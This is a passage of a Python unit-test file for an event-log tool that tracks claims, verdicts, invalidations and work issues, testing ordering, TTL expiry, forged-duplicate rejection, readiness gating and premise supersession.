        self.assertEqual(len(errors), 1)
        self.assertIn("duplicate id", errors[0])

    def test_identical_union_merge_duplicate_passes(self):
        """git's union merge can duplicate an identical line (equal ts);
        first-wins under a stable sort keeps the genuine record, so this
        must not error."""
        r = rec("claim", claim_p(), ts=self.T1)
        errors, _ = tm.order_check(events(r, dict(r)))
        self.assertEqual(errors, [])

    def test_later_duplicate_passes(self):
        evs = events(rec("claim", claim_p(), ts=self.T1),
                     rec("claim", claim_p(text="dup"), ts=self.T2))
        errors, _ = tm.order_check(evs)
        self.assertEqual(errors, [])

    def test_small_inversion_silent_large_inversion_warns(self):
        near = "2026-07-02T00:00:00+00:00"
        near_minus_10s = "2026-07-01T23:59:50+00:00"
        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=near),
                     rec("claim", claim_p(text="b"), rid="tr-00000002",
                         ts=near_minus_10s))
        _, warnings = tm.order_check(evs)
        self.assertEqual(warnings, [])
        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=self.T3),
                     rec("claim", claim_p(text="b"), rid="tr-00000002",
                         ts=self.T1))
        errors, warnings = tm.order_check(evs)
        self.assertEqual(errors, [])
        self.assertEqual(len(warnings), 1)

    def test_backdated_duplicate_with_naive_ts_is_caught(self):
        """F2/v0.6.2: a tz-naive forged ts sorts before a tz-aware
        genuine one by raw string (fold's key) but used to slip past the
        parsed comparison, which abstained on tz mismatch."""
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="sub"),
                         ts="2026-07-01T00:00:00"))  # naive, no offset
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("duplicate id", errors[0])

    def test_backdated_duplicate_with_junk_ts_is_caught(self):
        """F2/v0.6.2: an unparseable ts made parse_ts return None, so the
        old comparison abstained; by raw string 'z...'<ISO it still sorts
        first in the fold."""
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="sub"), ts="1"))
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)

    def test_issue_event_before_its_issue_is_an_error(self):
        """ADR-028: an issue_event sorting BEFORE its issue record is a
        forward reference fold_issues silently drops -- the future-dated-
        issue hole. A raw honest-clock event on a 2027-dated issue record
        sorts first and must be refused at the commit gate."""
        evs = events(
            rec("issue", {"title": "future"}, rid="wk-0000f00d",
                ts="2027-06-01T00:00:00+00:00"),
            rec("issue_event", {"issue": "wk-0000f00d", "event": "closed",
                                "basis": "raw"}, rid="tr-11110001",
                ts="2026-07-19T00:00:00+00:00"))
        errors, _ = tm.order_check(evs)
        self.assertTrue(any("sorts before its issue record" in e
                            for e in errors), errors)

    def test_issue_event_after_its_issue_passes(self):
        """No false positive: the normal order (issue then event) is fine."""
        evs = events(
            rec("issue", {"title": "ok"}, rid="wk-0000aaaa",
                ts="2026-07-01T00:00:00+00:00"),
            rec("issue_event", {"issue": "wk-0000aaaa", "event": "claimed",
                                "basis": ""}, rid="tr-11110002",
                ts="2026-07-02T00:00:00+00:00"))
        errors, _ = tm.order_check(evs)
        self.assertEqual(errors, [])

# --------------------------------------------------------- stats (FS-1)

class TestStats(unittest.TestCase):
    def _world(self):
        return events(
            rec("claim", claim_p(cost_tier="P1"), rid="tr-000000a1",
                ts="2026-07-01T00:00:00+00:00"),
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a2",
                ts="2026-07-01T00:00:00+00:00"),
            rec("invalidation", {"claim": "tr-000000a1", "commit": "c",
                                 "reason": "r"}, rid="tr-000000a3",
                ts="2026-07-05T00:00:00+00:00"))

    def test_half_life_measured_live_to_stale(self):
        obs, _ = tm.half_life_observations(self._world())
        self.assertEqual(obs, [("P1", 4.0)])

    def test_half_life_replay_matches_fold(self):
        """The mini-replay must never disagree with fold() on final
        status -- fold stays authoritative; this is the drift guard."""
        evs = self._world() + events(
            rec("claim", claim_p(text="second"), rid="tr-000000b1",
                ts="2026-07-02T00:00:00+00:00"),
            rec("verdict", {"claim": "tr-000000b1", "verdict": "retracted",
                            "basis": "b"}, rid="tr-000000b2",
                ts="2026-07-03T00:00:00+00:00"))
        evs = list(enumerate([e for _, e in evs], 1))
        _, replay_status = tm.half_life_observations(evs)
        claims, _ = tm.fold(evs)
        self.assertEqual(replay_status,
                         {cid: e["status"] for cid, e in claims.items()})

    def test_stats_report_splits_mechanical(self):
        evs = self._world() + events(
            rec("verdict", {"claim": "tr-000000a1", "verdict": "diverge",
                            "basis": "b", "subtype": "mechanical"},
                rid="tr-000000c1", ts="2026-07-06T00:00:00+00:00"))
        evs = list(enumerate([e for _, e in evs], 1))
        report = tm.stats_report(evs, NOW)
        self.assertEqual(report["verdicts"]["diverge_mechanical"], 1)
        self.assertEqual(report["verdicts"]["diverge_genuine"], 0)
        self.assertEqual(report["half_life"]["P1"]["median_days"], 4.0)

    def test_ttl_suggestion_threshold(self):
        few = [("P1", 3.0)] * (tm.HALF_LIFE_MIN_OBS - 1)
        self.assertIsNone(tm.ttl_suggestion(few, "P1"))
        enough = [("P1", 3.0)] * tm.HALF_LIFE_MIN_OBS
        self.assertEqual(tm.ttl_suggestion(enough, "P1"), 3.0)
        self.assertIsNone(tm.ttl_suggestion(enough, "P0"))

class TestMechanicalSubtypeFold(unittest.TestCase):
    def test_subtype_surfaces_in_queue(self):
        evs = events(
            rec("claim", claim_p(cost_tier="P1")),
            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                            "basis": "b", "subtype": "mechanical"},
                rid="tr-00000002", ts="2026-07-02T00:00:00+00:00"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["subtype"], "mechanical")
        rows = tm.queue_rows(claims, NOW)
        self.assertIn("mechanical", rows[0]["reason"])

# ---------------------------------------------------- recheck decisions

class TestRecheck(unittest.TestCase):
    EV = {"command": "cat f", "output_hash": "sha256:" + "a" * 64, "returncode": 0}

    def test_match_agrees(self):
        v, _ = tm.recheck_verdict(self.EV, "a" * 64, 0)
        self.assertEqual(v, "agree")

    def test_mismatch_diverges(self):
        v, basis = tm.recheck_verdict(self.EV, "b" * 64, 0)
        self.assertEqual(v, "diverge")
        self.assertIn("MISMATCH", basis)

    def test_returncode_mismatch_diverges(self):
        v, _ = tm.recheck_verdict(self.EV, "a" * 64, 1)
        self.assertEqual(v, "diverge")

    def test_127_is_cannot_verify(self):
        v, basis = tm.recheck_verdict(self.EV, "whatever", 127)
        self.assertEqual(v, "cannot_verify")
        self.assertIn("127", basis)

# ------------------------------------------------ invalidation strategies

def entry(payload, status="live", ts=TS):
    return {"status": status, "status_ts": ts,
            "claim": rec("claim", payload, ts=ts)}

class TestInvalidation(unittest.TestCase):
    def test_ttl_expired(self):
        e = entry(claim_p(ttl_days=1))
        d = tm.decide_invalidation(e, {"head": "h"}, NOW)  # NOW is 4 days later
        self.assertEqual(d["label"], "ttl expired")
        self.assertIn("ttl expired (1 days)", d["payload"]["reason"])

    def test_ttl_not_yet(self):
        e = entry(claim_p(ttl_days=30))
        self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW))

    def test_ttl_boundary_is_strict_from_claim_ts(self):
        """ADR-019 (H2): expiry counts from the claim's own ts with a
        STRICT boundary -- at exactly ts + ttl_days it survives; one unit
        past, it expires. And the reference instant is per-claim ts, not a
        fixed epoch, so a later-dated claim with the same ttl is not yet
        expired at the same `now`."""
        claim_dt = tm.parse_ts(TS)                       # 2026-07-01T00:00:00Z
        exact = claim_dt + timedelta(days=4)             # ts + ttl_days
        just_after = exact + timedelta(seconds=1)
        e = entry(claim_p(ttl_days=4), ts=TS)
        self.assertIsNone(                               # strict >: boundary survives
            tm.decide_invalidation(e, {"head": "h"}, exact))
        d = tm.decide_invalidation(e, {"head": "h"}, just_after)
        self.assertEqual(d["label"], "ttl expired")      # one second past: expired
        later = entry(claim_p(ttl_days=4),
                      ts="2026-07-02T00:00:00.000000+00:00")
        self.assertIsNone(                               # counted from ITS ts, not a global clock
            tm.decide_invalidation(later, {"head": "h"}, just_after))

    def test_fold_never_synthesizes_ttl_expiry(self):
        """ADR-019 (H2): the fold reads no clock. A TTL'd claim with no
        invalidation record folds non-stale however old -- only the scan
        (the sole clock reader) emits the record that demotes it. Guards
        against a future edit that makes the fold expire from wall-time
        (which would destroy purity/confluence, INV-I)."""
        old = "2020-01-01T00:00:00.000000+00:00"         # 6+ years before NOW
        claims, _ = tm.fold(events(rec("claim", claim_p(ttl_days=1), ts=old)))
        self.assertEqual(claims["tr-00000001"]["status"], "unverified")

    def test_anchor_unreachable(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(e, {"head": "h", "anchor_reachable": False}, NOW)
        self.assertEqual(d["label"], "anchor unreachable")
        self.assertIn("anchor unreachable", d["payload"]["reason"])

    def test_paths_touched(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["f.txt", "other.py"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "paths changed")
        self.assertEqual(d["payload"]["touched"], ["f.txt"])

    def test_untouched_paths_no_decision(self):
        e = entry(verified_p())
        self.assertIsNone(tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["other.py"], "diff_error": None}, NOW))

    def test_empty_glob_is_dormant_not_dead(self):
        """ADR-023 (H5): a glob matching zero tracked files at filing time
        is EXEMPT from the intake dead-literal gate, and -- the crux --
        still FIRES once its namespace fills, because the invalidator
        re-evaluates the pattern against each scan's diff rather than
        freezing its matches at filing time. So an empty glob is *dormant*,
        not dead; the finding that 'an empty glob can never fire' is
        refuted right here."""
        glob = "src/ghost/*.py"
        # (1) intake exempts the zero-match glob -- it has no single referent
        self.assertEqual(tm.dead_literal_paths([glob], []), [])
        e = entry(verified_p(evidence_paths=[glob]))
        # (2) dormant while the namespace stays empty: an unrelated change misses
        self.assertIsNone(tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["src/other/x.py"], "diff_error": None}, NOW))
        # (3) fires the moment a matching file is created and diffed
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["src/ghost/appeared.py"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "paths changed")
        self.assertEqual(d["payload"]["touched"], ["src/ghost/appeared.py"])

    def test_diff_error_fails_toward_distrust(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": None, "diff_error": "boom"}, NOW)
        self.assertEqual(d["label"], "diff failed")

    def test_facts_not_gathered_means_abstain(self):
        e = entry(verified_p())
        self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW))

    def test_ttl_precedes_paths(self):
        e = entry(verified_p(ttl_days=1))
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["f.txt"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "ttl expired")

    def test_terminal_and_settled_states_skipped(self):
        for status in ("stale", "diverged", "retracted", "cannot_verify"):
            e = entry(verified_p(ttl_days=1), status=status)
            self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW), status)

# --------------------------------------------------------- consumers

class TestQueue(unittest.TestCase):
    def make(self, status, tier):
        return {"tr-0000000c": entry(claim_p(cost_tier=tier), status=status)}

    def test_membership(self):
        cases = [("diverged", "P2", True), ("stale", "P0", True),
                 ("stale", "P1", True), ("stale", "P2", False),
                 ("cannot_verify", "P0", True), ("cannot_verify", "P1", False),
                 ("live", "P0", False), ("retracted", "P0", False)]
        for status, tier, expect in cases:
            rows = tm.queue_rows(self.make(status, tier), NOW)
            self.assertEqual(bool(rows), expect, (status, tier))

    def test_age_days_uses_injected_now(self):
        rows = tm.queue_rows(self.make("diverged", "P1"), NOW)
        self.assertEqual(rows[0]["age_days"], 4)  # TS -> NOW

class TestJoinReady(unittest.TestCase):
    def setUp(self):
        self.claims = {
            "tr-000000aa": entry(claim_p(cost_tier="P1"), status="live"),
            "tr-000000bb": entry(claim_p(cost_tier="P1"), status="stale"),
            "tr-000000cc": entry(claim_p(cost_tier="P0"), status="cannot_verify"),
            "tr-000000dd": entry(claim_p(cost_tier="P1"), status="unverified"),
        }

    def go(self, premises):
        issues = [{"id": "bd-x1", "title": "t"}]
        return tm.join_ready(issues, self.claims, premises)

    def test_live_passes(self):
        ready, _ = self.go({"bd-x1": ["tr-000000aa"]})
        self.assertEqual(len(ready), 1)
        self.assertEqual(ready[0]["_truth"]["warnings"], [])

    def test_unverified_passes_with_warning(self):
        ready, _ = self.go({"bd-x1": ["tr-000000dd"]})
        self.assertEqual(len(ready), 1)
        self.assertTrue(ready[0]["_truth"]["warnings"])

    def test_stale_blocks(self):
        ready, annotated = self.go({"bd-x1": ["tr-000000bb"]})
        self.assertEqual(ready, [])
        self.assertIn("tr-000000bb (stale)",
                      annotated[0]["_truth"]["broken_premises"])

    def test_cannot_verify_p0_blocks(self):
        ready, _ = self.go({"bd-x1": ["tr-000000cc"]})
        self.assertEqual(ready, [])

    def test_missing_blocks(self):
        ready, annotated = self.go({"bd-x1": ["tr-000000ff"]})
        self.assertEqual(ready, [])
        self.assertIn("tr-000000ff (missing)",
                      annotated[0]["_truth"]["broken_premises"])

    def test_no_premises_passes(self):
        ready, _ = self.go({})
        self.assertEqual(len(ready), 1)

class TestDispatch(unittest.TestCase):
    def test_header_stripped_claim_appended(self):
        prompt = "human header\n---\nVERIFIER BODY\n\n1. RULE ONE.\n2. RULE TWO.\n"
        out = tm.dispatch_text(prompt, rec("claim", claim_p()))
        self.assertNotIn("human header", out)
        self.assertIn("VERIFIER BODY", out)
        self.assertIn("CLAIM RECORD", out)
        self.assertIn('"tr-00000001"', out)

    def test_envelope_self_describes_integrity(self):
        # TL-3: transports can lossily compress the dispatch; a complete
        # copy must be distinguishable from a truncated one by its reader.
        import hashlib as _h
        prompt = "human header\n---\nVERIFIER BODY\n\n1. RULE ONE.\n2. RULE TWO.\n"
        out = tm.dispatch_text(prompt, rec("claim", claim_p()))
        digest = _h.sha256(prompt.encode("utf-8")).hexdigest()
        self.assertTrue(out.startswith("INTEGRITY (check before following)"))
        self.assertIn("contains 2 numbered rules", out)
        self.assertTrue(out.endswith(f"END-OF-DISPATCH sha256:{digest}"))
        # claim record sits INSIDE the envelope, so record truncation is
        # also caught by a missing terminator
        self.assertLess(out.index("CLAIM RECORD"), out.rindex("END-OF-DISPATCH"))

# ------------------------------------------------ work kernel (ADR-002)

def issue_rec(rid="wk-00000001", ts=TS, **over):
    p = {"title": "do the thing", "text": "", "deps": [], "premises": []}
    p.update(over)
    return rec("issue", p, rid=rid, ts=ts)

def issue_ev(event, ref="wk-00000001", ts=TS, rid="tr-000000e1", basis="b"):
    return rec("issue_event", {"issue": ref, "event": event, "basis": basis},
               rid=rid, ts=ts)

class TestFoldIssues(unittest.TestCase):
    def test_new_issue_is_open(self):
        issues = tm.fold_issues(events(issue_rec()))
        self.assertEqual(issues["wk-00000001"]["status"], "open")

    def test_lifecycle_open_claimed_closed_reopened(self):
        evs = events(
            issue_rec(ts="2026-07-01T00:00:00+00:00"),
            issue_ev("claimed", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1"),
            issue_ev("closed", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2"),
            issue_ev("reopened", ts="2026-07-01T00:00:03+00:00", rid="tr-000000e3"))
        for cut, want in ((1, "open"), (2, "claimed"), (3, "closed"), (4, "open")):
            issues = tm.fold_issues(evs[:cut])
            self.assertEqual(issues["wk-00000001"]["status"], want)

    def test_cancelled_is_terminal(self):
        evs = events(
            issue_rec(ts="2026-07-01T00:00:00+00:00"),
            issue_ev("cancelled", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1"),
            issue_ev("reopened", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2"),
            issue_ev("claimed", ts="2026-07-01T00:00:03+00:00", rid="tr-000000e3"))
        issues = tm.fold_issues(evs)
        self.assertEqual(issues["wk-00000001"]["status"], "cancelled")

    def test_first_issue_payload_wins(self):
        """ADR-006: matches fold()'s claim handling -- a duplicate wk- id
        cannot alter the issue's title, deps, or premises, no matter its
        timestamp."""
        evs = events(
            issue_rec(title="v1", ts="2026-07-01T00:00:00+00:00"),
            issue_rec(title="v2", ts="2026-07-01T00:00:05+00:00"))
        issues = tm.fold_issues(evs)
        self.assertEqual(issues["wk-00000001"]["issue"]["payload"]["title"], "v1")

    def test_duplicate_issue_id_cannot_strip_premises(self):
        """ADR-006: the finding this fix closes -- a later-timestamped
        duplicate wk- id emptying `premises` must not disarm ADR-001
        protection. No backdating needed for this attack (last-wins would
        have let an ordinary 'now' timestamp win), which is exactly why
        last-wins was the wrong default."""
        evs = events(
            issue_rec(premises=["tr-000000c1"], ts="2026-07-01T00:00:00+00:00"),
            issue_rec(premises=[], ts="2099-01-01T00:00:00+00:00"))
        issues = tm.fold_issues(evs)
        self.assertEqual(
            issues["wk-00000001"]["issue"]["payload"]["premises"],
            ["tr-000000c1"])

    def test_confluence_all_permutations_with_duplicate_id(self):
        """v0.5.6: coverage symmetry with the claims fold — first-wins
        under a duplicate wk- id must be confluent across every arrival
        order, not just the two fixed orders the ADR-006 tests exercise."""
        import itertools
        evs = [issue_rec(premises=["tr-000000c1"],
                         ts="2026-07-01T00:00:00+00:00"),
               issue_rec(premises=[], title="forged",
                         ts="2099-01-01T00:00:00+00:00"),
               issue_ev("claimed", ts="2026-07-02T00:00:00+00:00")]
        states = set()
        for perm in itertools.permutations(evs):
            issues = tm.fold_issues(list(enumerate(perm, 1)))
            e = issues["wk-00000001"]
            states.add((e["status"],
                        tuple(e["issue"]["payload"]["premises"]),
                        e["issue"]["payload"]["title"]))
        self.assertEqual(states,
                         {("claimed", ("tr-000000c1",), "do the thing")})

    def test_confluence_file_order_irrelevant(self):
        a = issue_rec(ts="2026-07-01T00:00:00+00:00")
        b = issue_ev("claimed", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1")
        c = issue_ev("closed", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2")
        fwd = tm.fold_issues(events(a, b, c))
        rev = tm.fold_issues(events(c, b, a))
        self.assertEqual(fwd["wk-00000001"]["status"],
                         rev["wk-00000001"]["status"])

    def test_event_for_unknown_issue_ignored(self):
        issues = tm.fold_issues(events(issue_ev("closed", ref="wk-deadbeef")))
        self.assertEqual(issues, {})

class TestIssueEventError(unittest.TestCase):
    def test_transition_matrix(self):
        ok = [("open", "claimed"), ("claimed", "released"), ("open", "closed"),
              ("claimed", "closed"), ("closed", "reopened"),
              ("open", "cancelled"), ("claimed", "cancelled"),
              ("closed", "cancelled")]
        bad = [("closed", "claimed"), ("open", "released"), ("open", "reopened"),
               ("closed", "closed"), ("cancelled", "reopened"),
               ("cancelled", "closed"), ("cancelled", "claimed")]
        for st, ev in ok:
            self.assertIsNone(tm.issue_event_error(st, ev), f"{st}->{ev}")
        for st, ev in bad:
            self.assertIsNotNone(tm.issue_event_error(st, ev), f"{st}->{ev}")

    def test_future_dated_issue_refused_at_intake(self):
        """ADR-028: acting on an issue whose record is dated beyond skew in
        the future is refused -- an event filed now would sort before it and
        the fold would drop it. NOW is the core's fixed clock (12:00)."""
        future = {"id": "wk-00000001", "ts": "2027-06-01T00:00:00.000000+00:00"}
        self.assertIsNotNone(tm.issue_event_ts_error(future, NOW))
        present = {"id": "wk-00000002", "ts": "2026-07-05T11:59:00.000000+00:00"}
        self.assertIsNone(tm.issue_event_ts_error(present, NOW))

class TestNativeReady(unittest.TestCase):
    def _issues(self, *evs):
        return tm.fold_issues(events(*evs))

    def test_open_no_deps_is_ready(self):
        ready = tm.native_ready_issues(self._issues(issue_rec()))
        self.assertEqual(ready, [{"id": "wk-00000001", "title": "do the thing"}])

    def test_claimed_not_ready(self):
        issues = self._issues(issue_rec(), issue_ev("claimed",
                              ts="2026-07-01T00:00:01+00:00"))
        self.assertEqual(tm.native_ready_issues(issues), [])

    def test_dep_gates_until_closed(self):
        dep = issue_rec(rid="wk-000000aa", ts="2026-07-01T00:00:00+00:00")
        top = issue_rec(rid="wk-000000bb", deps=["wk-000000aa"],
                        ts="2026-07-01T00:00:00+00:00")
        blocked = self._issues(dep, top)
        self.assertNotIn("wk-000000bb",
                         [i["id"] for i in tm.native_ready_issues(blocked)])
        unblocked = self._issues(dep, top,
                                 issue_ev("closed", ref="wk-000000aa",
                                          ts="2026-07-01T00:00:01+00:00"))
        self.assertIn("wk-000000bb",
                      [i["id"] for i in tm.native_ready_issues(unblocked)])

    def test_cancelled_or_unknown_dep_blocks_forever(self):
        dep = issue_rec(rid="wk-000000aa", ts="2026-07-01T00:00:00+00:00")
        top = issue_rec(rid="wk-000000bb", deps=["wk-000000aa"],
                        ts="2026-07-01T00:00:00+00:00")
        cancelled = self._issues(dep, top,
                                 issue_ev("cancelled", ref="wk-000000aa",
                                          ts="2026-07-01T00:00:01+00:00"))
        self.assertNotIn("wk-000000bb",
                         [i["id"] for i in tm.native_ready_issues(cancelled)])
        ghost = self._issues(issue_rec(rid="wk-000000bb", deps=["wk-00ghost0"]))
        self.assertEqual(tm.native_ready_issues(ghost), [])

class TestIssuePremiseMerge(unittest.TestCase):
    def test_premise_at_birth_collected_and_merged(self):
        issues = tm.fold_issues(events(issue_rec(premises=["tr-000000c1"])))
        born = tm.issue_premises(issues)
        self.assertEqual(born, {"wk-00000001": ["tr-000000c1"]})
        merged = tm.merge_premises({"wk-00000001": ["tr-000000c2"],
                                    "bd-x1": ["tr-000000c3"]}, born)
        self.assertEqual(merged["wk-00000001"], ["tr-000000c2", "tr-000000c1"])
        self.assertEqual(merged["bd-x1"], ["tr-000000c3"])

    def test_merge_deduplicates(self):
        merged = tm.merge_premises({"w": ["tr-000000c1"]},
                                   {"w": ["tr-000000c1"]})
        self.assertEqual(merged["w"], ["tr-000000c1"])

# --------------------------------------------- premise supersede (ADR-013)

class TestSupersedes(unittest.TestCase):
    def _redirect(self, issue, old, new, ts):
        return rec("premise", {"issue": issue, "claim": new,
                               "supersedes": old}, ts=ts)

    def test_redirect_rewrites_merged_premises(self):
        supers = tm.fold_supersedes(events(
            self._redirect("wk-00000001", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00")))
        out = tm.apply_supersedes({"wk-00000001": ["tr-000000d1"]}, supers)
        self.assertEqual(out, {"wk-00000001": ["tr-000000d2"]})

    def test_redirect_scoped_to_one_issue(self):
        supers = tm.fold_supersedes(events(
            self._redirect("wk-00000001", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00")))
        out = tm.apply_supersedes({"wk-00000001": ["tr-000000d1"],
                                   "wk-00000002": ["tr-000000d1"]}, supers)
        self.assertEqual(out["wk-00000001"], ["tr-000000d2"])
        self.assertEqual(out["wk-00000002"], ["tr-000000d1"])

    def test_chain_follows_to_fixed_point_and_dedupes(self):
        supers = tm.fold_supersedes(events(
            self._redirect("w", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00"),
            self._redirect("w", "tr-000000d2", "tr-000000d3",
                           "2026-07-01T01:00:00+00:00")))
        out = tm.apply_supersedes({"w": ["tr-000000d1", "tr-000000d3"]},
                                  supers)
        self.assertEqual(out["w"], ["tr-000000d3"])

    def test_cycle_stops_at_first_repeat(self):
        supers = tm.fold_supersedes(events(
            self._redirect("w", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00"),
            self._redirect("w", "tr-000000d2", "tr-000000d1",
                           "2026-07-01T01:00:00+00:00")))
        out = tm.apply_supersedes({"w": ["tr-000000d1"]}, supers)
        # ADR-013 clarified (HIGH-2): a 2-cycle a->b->a entered at a
        # resolves back to a -- a deterministic no-op, not an escape
        self.assertEqual(out["w"], ["tr-000000d1"])

    def test_chain_into_cycle_resolves_to_entry_point(self):
        # ADR-013 clarified (HIGH-2): the effective premise on a cycle is
        # the FIRST REPEATED value, which for a chain into a cycle is the
        # cycle's entry point, not the chain's start. P->Q->R->Q from P
        # resolves to Q. This is the case the prose omitted and the
        # 2-cycle test alone did not distinguish.
        supers = tm.fold_supersedes(events(
            self._redirect("w", "tr-000000dP", "tr-000000dQ",
                           "2026-07-01T00:00:00+00:00"),
            self._redirect("w", "tr-000000dQ", "tr-000000dR",
                           "2026-07-01T01:00:00+00:00"),
            self._redirect("w", "tr-000000dR", "tr-000000dQ",
                           "2026-07-01T02:00:00+00:00")))
        out = tm.apply_supersedes({"w": ["tr-000000dP"]}, supers)
        self.assertEqual(out["w"], ["tr-000000dQ"])

    def test_last_wins_confluent_under_permutation(self):
        e1 = self._redirect("w", "tr-000000d1", "tr-000000d2",
                            "2026-07-01T00:00:00+00:00")
        e2 = self._redirect("w", "tr-000000d1", "tr-000000d3",
                            "2026-07-01T01:00:00+00:00")
        for order in ((e1, e2), (e2, e1)):
            supers = tm.fold_supersedes(events(*order))
            self.assertEqual(supers[("w", "tr-000000d1")], "tr-000000d3")

    def test_no_redirects_is_identity(self):
        prem = {"w": ["tr-000000d1"]}
        self.assertEqual(tm.apply_supersedes(prem, {}), prem)

# ------------------------------------------------- impact query (ADR-005)

class TestImpact(unittest.TestCase):
    def _world(self):
        evs = events(
            rec("claim", verified_p(evidence_paths=["src/**"]),
                rid="tr-000000a1"),
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a2",
                ts="2026-07-01T01:00:00+00:00"),
            issue_rec(rid="wk-000000b1", premises=["tr-000000a1"]),
            rec("premise", {"issue": "bd-x1", "claim": "tr-000000a1"},
                rid="tr-000000a3"),
            rec("claim", claim_p(text="retired fact",
                                 evidence_paths=["src/**"]),
                rid="tr-000000c9"),
            rec("verdict", {"claim": "tr-000000c9", "verdict": "retracted",
                            "basis": "dead"}, rid="tr-000000ca",
                ts="2026-07-01T01:00:00+00:00"))
        claims, premises = tm.fold(evs)
        issues = tm.fold_issues(evs)
        premises = tm.merge_premises(premises, tm.issue_premises(issues))
        return claims, issues, premises

    def test_watched_path_reported_with_holds(self):
        claims, issues, premises = self._world()
        rows = tm.impact_report(["src/deep/x.py"], claims, issues, premises)
        self.assertEqual([r["claim"] for r in rows], ["tr-000000a1"])
        self.assertEqual(rows[0]["holds"], ["bd-x1", "wk-000000b1"])
        self.assertEqual(rows[0]["touched"], ["src/deep/x.py"])

    def test_unwatched_path_is_silent(self):
        claims, issues, premises = self._world()
        self.assertEqual(
            tm.impact_report(["docs/readme.md"], claims, issues, premises),
            [])

    def test_dead_claims_never_whisper(self):
        """The retracted claim also watches src/** but must not appear:
        impact predicts stalings, and dead claims cannot stale."""
        claims, issues, premises = self._world()
        rows = tm.impact_report(["src/x.py"], claims, issues, premises)
        self.assertNotIn("tr-000000c9", [r["claim"] for r in rows])

    def test_closed_wk_hold_dropped_external_kept(self):
        claims, issues, premises = self._world()
        evs = events(
            issue_rec(rid="wk-000000b1", premises=["tr-000000a1"]),
            issue_ev("closed", ref="wk-000000b1", basis="done",
                     ts="2026-07-01T02:00:00+00:00"))
        issues = tm.fold_issues(evs)
        rows = tm.impact_report(["src/x.py"], claims, issues, premises)
        self.assertEqual(rows[0]["holds"], ["bd-x1"])

class TestDisputed(unittest.TestCase):
    """Issue #4: the contradicts edge and the DISPUTED post-pass."""
    def _base(self, verdicts=("agree", "agree")):
        evs = [rec("claim", claim_p(text="formula alpha"), rid="tr-000000d1"),
               rec("claim", claim_p(text="formula beta"), rid="tr-000000d2")]
        for i, v in enumerate(verdicts):
            if v:
                evs.append(rec("verdict", {"claim": f"tr-000000d{i+1}",
                                           "verdict": v, "basis": "b"},
                               rid=f"tr-000000e{i+1}",
                               ts="2026-07-02T00:00:00+00:00"))
        return evs

    def _edge(self, ts="2026-07-03T00:00:00+00:00", rid="tr-000000f1",
              a="tr-000000d1", b="tr-000000d2"):
        return rec("contradicts", {"a": a, "b": b, "basis": "incompatible"},
                   rid=rid, ts=ts)

    def test_both_live_fold_disputed_with_counterpart(self):
        claims, _ = tm.fold(events(*self._base(), self._edge()))
        for cid, other in (("tr-000000d1", "tr-000000d2"),
                           ("tr-000000d2", "tr-000000d1")):
            self.assertEqual(claims[cid]["status"], "disputed")
            self.assertEqual(claims[cid]["disputed_with"], [other])
            self.assertEqual(claims[cid]["status_ts"],
                             "2026-07-03T00:00:00+00:00")

    def test_dormant_when_either_side_not_live(self):
        for v in ("diverge", "retracted", None):
            claims, _ = tm.fold(events(*self._base(("agree", v)),
                                       self._edge()))
            self.assertEqual(claims["tr-000000d1"]["status"], "live",
                             f"edge fired against a {v or 'unverified'} side")

    def test_resolution_by_killing_one_side(self):
        evs = self._base() + [self._edge(),
                              rec("verdict", {"claim": "tr-000000d2",
                                              "verdict": "retracted",
                                              "basis": "loser"},
                                  rid="tr-000000e9",
                                  ts="2026-07-04T00:00:00+00:00")]
        claims, _ = tm.fold(events(*evs))
        self.assertEqual(claims["tr-000000d1"]["status"], "live")
        self.assertEqual(claims["tr-000000d2"]["status"], "retracted")

    def test_multi_edge_uses_underlying_statuses(self):
        # A-B and A-C: all three live underneath -> all disputed; C's
        # fate must not depend on whether A-B folded first
        evs = self._base() + [
            rec("claim", claim_p(text="formula gamma"), rid="tr-000000d3"),
            rec("verdict", {"claim": "tr-000000d3", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000e3",
                ts="2026-07-02T00:00:00+00:00"),
            self._edge(rid="tr-000000f1"),
            self._edge(rid="tr-000000f2", a="tr-000000d1", b="tr-000000d3",
                       ts="2026-07-03T01:00:00+00:00")]
        claims, _ = tm.fold(events(*evs))
        self.assertEqual(claims["tr-000000d3"]["status"], "disputed")
        self.assertEqual(claims["tr-000000d1"]["disputed_with"],
